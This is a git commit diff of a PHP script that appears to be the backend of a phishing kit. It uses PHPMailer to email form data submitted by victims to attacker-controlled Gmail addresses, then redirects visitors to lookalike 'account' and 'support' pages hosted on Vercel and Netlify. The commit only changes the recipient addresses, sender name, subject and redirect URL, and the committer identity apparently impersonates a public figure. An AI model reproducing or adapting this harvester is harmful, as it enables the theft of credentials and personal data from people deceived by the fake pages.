3928b9ec2baa6d94e9cc0efab1aabe0c5301f623
Sajjadphp322 <officialmarkzuckerofficial@gmail.com>
2025-07-19 01:28:45 +0500

    Update and rename abid.php to Jala.php

--- Jala.php
+++ Jala.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-ccczqz4cd1pfr6008-support.vercel.app/");
+header("Location: https://effulgent-empanada-705587-account.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -34,16 +34,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('herereplit@gmail.com', 'Hello DK');
-        $mail->addAddress('teamcyber102@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
+        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Abid';
+        $mail->Subject = 'jala';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
